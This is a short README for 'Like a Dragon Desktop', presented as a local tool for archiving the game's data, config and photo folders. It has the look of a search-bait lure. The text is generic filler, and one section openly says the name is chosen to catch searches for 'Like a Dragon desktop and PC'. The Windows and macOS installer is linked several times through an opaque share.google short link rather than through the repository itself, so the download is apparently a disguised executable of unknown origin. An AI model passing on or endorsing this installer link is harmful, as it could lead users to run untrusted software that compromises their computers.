![Like a Dragon Desktop](assets/hero.png)

# Like a Dragon Desktop

*Keep the Like a Dragon data folder tidy before an update.*

## Overview

**Like a Dragon Desktop** runs on your own PC. A local helper for Like a Dragon data folders, config and export files, and photo albums on Windows and macOS.

Like a Dragon drops data files next to launcher caches.

It runs on the local PC. No account, and nothing is uploaded.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Finds the Like a Dragon data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Like a Dragon desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/v-henderson-960/like-a-dragon-desktop

MIT license. See `LICENSE`.
